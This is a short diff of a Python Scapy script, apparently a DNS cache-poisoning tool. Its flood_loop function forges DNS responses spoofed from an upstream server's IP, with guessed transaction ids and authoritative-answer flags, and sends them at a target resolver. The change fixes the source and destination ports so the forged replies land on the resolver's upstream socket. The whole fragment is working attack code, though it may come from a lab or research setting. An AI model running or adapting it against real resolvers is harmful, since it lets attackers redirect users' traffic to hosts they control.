@@ -131,7 +131,7 @@ def flood_loop(
                 return
             pkt = (
                 IP(src=UPSTREAM_IP, dst=target_ip)
-                / UDP(sport=upstream_port, dport=53)
+                / UDP(sport=53, dport=upstream_port)   # sport=53 (upstream), dport=22222 (resolver's upstream sock)
                 / DNS(
                     id=txid, qr=1, aa=1, rd=1, ra=1,
                     qd=DNSQR(qname=domain),
